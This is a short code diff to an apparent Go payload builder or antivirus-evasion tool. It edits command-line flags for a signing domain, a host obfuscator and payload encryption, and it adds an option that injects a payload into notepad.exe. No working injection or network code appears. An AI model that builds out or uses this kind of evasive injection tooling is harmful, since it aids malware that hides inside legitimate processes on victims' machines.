@@ -26,12 +26,18 @@ func initialize() {
 	flag.StringVar(&mAv.domain, "domain", "baidu.com", "domain to be signed")
 	flag.StringVar(&mAv.hostObfuscator, "ho", "wwww.baidu.com", "host obfuscator")
 	flag.BoolVar(&mAv.crypt, "e", false, "payload to be encrypted")
+	flag.BoolVar(&mAv.inject, "inject", false, "inject payload to notepad.exe")
 	flag.Parse()
 
 	if err := mAv.validate(); err != nil {
 		logrus.Error(err.Error())
 		os.Exit(0)
 	}
+
+	logrus.SetFormatter(&logrus.TextFormatter{
+		DisableColors:    false,
+		DisableTimestamp: true,
+	})
 }
 
 func (c *config) validate() error {
@@ -42,7 +48,6 @@ func (c *config) validate() error {
 	}
 	switch c.os {
 	case "windows":
-	case "linux":
 	default:
 		return fmt.Errorf("not Support OS: %v", c.os)
 	}
